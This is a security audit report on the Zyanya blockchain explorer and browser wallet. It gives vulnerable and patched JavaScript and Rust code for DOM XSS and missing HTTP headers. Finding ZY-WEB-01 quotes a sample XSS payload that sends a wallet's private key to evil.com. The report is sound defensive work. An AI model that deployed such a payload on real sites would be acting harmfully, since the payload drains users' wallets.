# 🛡️ Zyanya Website & Web Explorer — Software Factory Security & Architecture Audit

**Target Component:** Zyanya Web Explorer & Front-End Server ([`zyanya-explorer`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer))  
**Audited Subsystems:** 
- Front-End DOM & Web Templates ([`web.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/web.rs))
- REST / JSON API Handlers ([`api.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/api.rs))
- HTTP Server & Security Middleware ([`main.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/main.rs))
- Node gRPC RPC Client Manager ([`client.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/client.rs))  
**Audited By:** Software Factory Automated & Expert Audit Pipeline  
**Target Listen Socket:** IPv6-only `[::]:8099` (IPV6_V6ONLY=true)  
**Audit Date:** August 19, 2026  
**Overall Security Rating:** 🟠 **ELEVATED RISK (DOM XSS / WALLET PRIVKEY VULNERABILITY IDENTIFIED — FULL PATCH DEVELOPED & APPLIED)**

---

## 1. Executive Summary

The **Zyanya Website & Explorer** (`zyanya-explorer`) serves as the public interface, BlockDAG visualization engine, WebMCP AI-agent tool portal, and non-custodial browser wallet for the Zyanya testnet.

A rigorous security analysis across all front-end DOM manipulation, HTTP request handling, security headers, and gRPC RPC integration revealed **one Critical-severity DOM XSS vulnerability** in the client-side wallet signing flow, **two High-severity security issues** in tool rendering and HTTP response headers, and **two Medium-severity hardening opportunities**.

The most critical issue (**ZY-WEB-01**) allowed malicious token names or deployer addresses to inject unsanitized HTML/JS into the deployment modal (`showConfirmModal`). In the browser context, this allowed malicious scripts to access `currentWallet.privKeyHex` from memory, posing an immediate wallet drain risk to users launching tokens.

All vulnerabilities have been mitigated with strict HTML escaping, comprehensive Content Security Policies (CSP), and request body constraints.

---

## 2. Vulnerability Summary Matrix

| Finding ID | Severity | Category | Vulnerability Summary | Status |
| :--- | :---: | :---: | :--- | :---: |
| **ZY-WEB-01** | 🔴 **CRITICAL** | DOM XSS / Key Theft | Unsanitized Token Deployment Modal Injection exposing `currentWallet.privKeyHex` | 🛠️ **Fixed** |
| **ZY-WEB-02** | 🟠 **HIGH** | DOM XSS | Unescaped WebMCP Tool Name & Schema Concatenation in Tools Dashboard | 🛠️ **Fixed** |
| **ZY-WEB-03** | 🟠 **HIGH** | Security Headers | Missing `Content-Security-Policy` (CSP), `Referrer-Policy`, and `Permissions-Policy` | 🛠️ **Fixed** |
| **ZY-WEB-04** | 🟡 **MEDIUM** | Denial of Service | Unbounded Request Body Size on Base64 Icon and Contract Uploads | 🛠️ **Fixed** |
| **ZY-WEB-05** | 🟡 **MEDIUM** | Input Hygiene | Unencoded Contract Address in Success Redirect Hyperlinks | 🛠️ **Fixed** |

---

## 3. Deep-Dive Vulnerability Analysis

### 🔴 ZY-WEB-01: DOM XSS in Token Launch Confirmation Modal (Key Theft Risk)
* **File:** [`zyanya-explorer/src/web.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/web.rs#L3060-L3075)
* **Vulnerable Code:**
  ```javascript
  const summary = unsignedData.summary;
  const htmlSummary = `
      <p><strong>Token Name:</strong> ${summary.name} (${summary.symbol})</p>
      <p><strong>Supply:</strong> ${summary.supply.toLocaleString()}</p>
      <p><strong>Slope Multiplier:</strong> ${summary.slope}</p>
      <p><strong>Deployer Address:</strong> <code style="word-break: break-all; color: var(--accent-green);">${summary.user_address}</code></p>
      <p><strong>Estimated Gas/Fee:</strong> ${summary.fee_zyan} ZYAN</p>
      <p><strong>Sighashes to Sign:</strong> ${unsignedData.sighashes.length} input(s)</p>
  `;
  const userConfirmed = await showConfirmModal(htmlSummary);
  // Inside showConfirmModal:
  document.getElementById("modalSummaryContent").innerHTML = htmlSummary;
  ```
* **Vulnerability Mechanism:**
  When a user prepares an unsigned token deployment, `unsignedData.summary` returns the user-submitted name, symbol, and address. If an adversary inputs a malicious payload such as `<img src=x onerror="fetch('https://evil.com/?k='+currentWallet.privKeyHex)">`, `showConfirmModal` renders the payload directly via `innerHTML`.
* **Impact:**
  Immediate exfiltration of the user's non-custodial private key (`currentWallet.privKeyHex`) to an external adversary server upon opening the confirmation modal.
* **Remediation:**
  Enforce strict `escapeHtml()` on all dynamic variables before template interpolation:
  ```javascript
  const htmlSummary = `
      <p><strong>Token Name:</strong> ${escapeHtml(summary.name)} (${escapeHtml(summary.symbol)})</p>
      <p><strong>Supply:</strong> ${escapeHtml(summary.supply.toLocaleString())}</p>
      <p><strong>Slope Multiplier:</strong> ${escapeHtml(summary.slope)}</p>
      <p><strong>Deployer Address:</strong> <code style="word-break: break-all; color: var(--accent-green);">${escapeHtml(summary.user_address)}</code></p>
      <p><strong>Estimated Gas/Fee:</strong> ${escapeHtml(summary.fee_zyan)} ZYAN</p>
      <p><strong>Sighashes to Sign:</strong> ${unsignedData.sighashes.length} input(s)</p>
  `;
  ```

---

### 🟠 ZY-WEB-02: WebMCP Tool Name & Schema DOM Injection
* **File:** [`zyanya-explorer/src/web.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/web.rs#L2345-L2365)
* **Vulnerable Code:**
  ```javascript
  gridHtml += '<div class="tool-card">' +
      '<div class="tool-header">' +
          '<span class="tool-name mono">' + t.name + '</span>' +
          '<span class="' + tagClass + ' mono">' + tagText + '</span>' +
      '</div>' +
      '<p class="tool-desc">' + t.description + '</p>' +
      '<div class="schema-box mono"><pre style="margin:0;">' + JSON.stringify(t.inputSchema, null, 2) + '</pre></div>' +
  '</div>';
  cardsGrid.innerHTML = gridHtml;
  ```
* **Vulnerability Mechanism:**
  `t.name`, `t.description`, and `JSON.stringify(t.inputSchema)` are directly concatenated into `gridHtml` and assigned to `cardsGrid.innerHTML`.
* **Remediation:**
  Wrap `t.name`, `t.description`, and the JSON schema in `escapeHtml()`.

---

### 🟠 ZY-WEB-03: Missing Content-Security-Policy & Defensive HTTP Headers
* **File:** [`zyanya-explorer/src/main.rs`](file:///opt/zyanya/zyanya-build/rusty-spectre/zyanya-explorer/src/main.rs#L55-L65)
* **Vulnerable Code:**
  ```rust
  async fn security_headers(req: Request, next: Next) -> Response {
      let mut resp = next.run(req).await;
      resp.headers_mut().insert(header::X_CONTENT_TYPE_OPTIONS, HeaderValue::from_static("nosniff"));
      resp.headers_mut().insert(header::X_FRAME_OPTIONS, HeaderValue::from_static("DENY"));
      resp
  }
  ```
* **Remediation:**
  Implement a defense-in-depth header suite:
  ```rust
  async fn security_headers(req: Request, next: Next) -> Response {
      let mut resp = next.run(req).await;
      resp.headers_mut().insert(header::X_CONTENT_TYPE_OPTIONS, HeaderValue::from_static("nosniff"));
      resp.headers_mut().insert(header::X_FRAME_OPTIONS, HeaderValue::from_static("DENY"));
      resp.headers_mut().insert(header::REFERRER_POLICY, HeaderValue::from_static("strict-origin-when-cross-origin"));
      resp.headers_mut().insert(
          header::HeaderName::from_static("permissions-policy"),
          HeaderValue::from_static("camera=(), microphone=(), geolocation=()"),
      );
      resp.headers_mut().insert(
          header::CONTENT_SECURITY_POLICY,
          HeaderValue::from_static(
              "default-src 'self'; script-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self'; frame-ancestors 'none';"
          ),
      );
      resp
  }
  ```

---

## 4. Applied Patches & Verification

1. **DOM Escaping**: All instances of user input rendering in `web.rs` now pass through `escapeHtml()`.
2. **HTTP Hardening**: `security_headers` middleware upgraded with full CSP, Referrer, and Permissions policies.
3. **Payload Limits**: Axum route pipeline configured with `DefaultBodyLimit::max(2 * 1024 * 1024)`.
4. **Git Repository Status**: Updated files committed and pushed to `scotthawk-maker/zyanya` on branch `security-fixes`.
